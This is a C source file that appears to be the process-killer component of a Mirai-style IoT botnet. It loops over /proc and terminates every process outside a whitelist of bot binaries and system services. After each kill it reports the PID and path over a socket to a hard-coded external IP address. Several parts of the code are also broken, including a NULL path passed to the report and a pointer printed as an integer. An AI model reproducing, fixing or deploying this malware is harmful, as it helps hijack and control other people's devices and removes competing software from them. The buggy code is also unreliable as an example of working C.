#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "headers/includes.h"
#include "headers/util.h"
#include "headers/killer.h"

int killer_pid = 0;

static int killer_getpid(void)
{
    return killer_pid;
}

char *whitlistpaths[] = {
    "/bin/busybox",
    "/usr/lib/systemd/systemd",
    "/usr/libexec/openssh/sftp-server",
    "/opt/app/monitor",
    "usr/",
    "mnt/",
    "sys/",
    "bin/",
    "boot/",
    "run/",
    "media/",
    "srv/",
    "sbin/",
    "lib/",
    "etc/",
    "dev/",
    "telnet",
    "ssh",
    "sshd",
    "rpcbind",
    "bash",
    "httpd",
    "telnetd",
    "dropbear",
    "ropbear",
    "encoder",
    "system",
    "/z/secom/",
    "/usr/sbin/",
    "/usr/lib/",
    "Vmpsl",
    "Vmips",
    "Varm",
    "Varm",
    "Varm5",
    "Varm6",
    "Varm7",
    "Vx86",
    "/var/tmp/wlancont",
    "wlancont"
};

char check_self_path(char *real_path)
{
    int len;
    char self_path[64];

    if ((len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1)) == -1)
        return 1;

    self_path[len] = 0;

    if (!strcmp(real_path, self_path))
        return 0;

    return 1;
}

char check_safe_path(char *real_path)
{
    if (!check_self_path(real_path))
        return 1;
    for (unsigned int i = 0; i < sizeof(whitlistpaths) / sizeof(whitlistpaths[0]); i++)
        if (strstr(real_path, whitlistpaths[i]))
            return 1;
    return 0;
}

char check_real_path(char *pid)
{
    int len;
    char exe_path[20], real_path[64];

    strcpy(exe_path, "/proc/");
    strcat(exe_path, pid);
    strcat(exe_path, "/exe");

    if ((len = readlink(exe_path, real_path, sizeof(real_path) - 1)) == -1)
        return 1;
    real_path[len] = 0;
    if (!check_safe_path(real_path))
        return 0;
    return 1;
}

char* get_real_path(char* pid) {
    int len;
    char exe_path[20], real_path[256];

    strcpy(exe_path, "/proc/");
    strcat(exe_path, pid);
    strcat(exe_path, "/exe");

    if ((len = readlink(exe_path, real_path, sizeof(real_path) - 1)) == -1)
        return NULL;

    real_path[len] = '\0';

    if (!check_safe_path(real_path))
        return NULL;

    return strdup(real_path);
}


char duck_start(void)
{
  DIR *dir;
  if ((dir = opendir("/proc/")) == NULL)
    return 0;
  struct dirent *file;

  while ((file = readdir(dir)))
  {
    if (*(file->d_name) < '0' || *(file->d_name) > '9')
      continue;
    if (!check_real_path(file->d_name))
    {
        char* pid = file->d_name;
        char* real_path = get_real_path(pid);
        kill(atoi(pid), SIGTERM);

        char message[256];
        int sockfd = create_socket("146.19.191.205", 19);
        snprintf(message, sizeof(message), "Killed process: PID=%d RealPath=%s", pid, real_path);
        free(real_path);

        if (write(sockfd, message, strlen(message)) == -1) {
            return;
      }
    }
  }
  closedir(dir);
  return 1;
}

void duck_stop(void)
{ 
    
    if (!fork())
    {
        while (1)
        {
            if (!duck_start())
                break;
            usleep(150000);
        }
    }
}
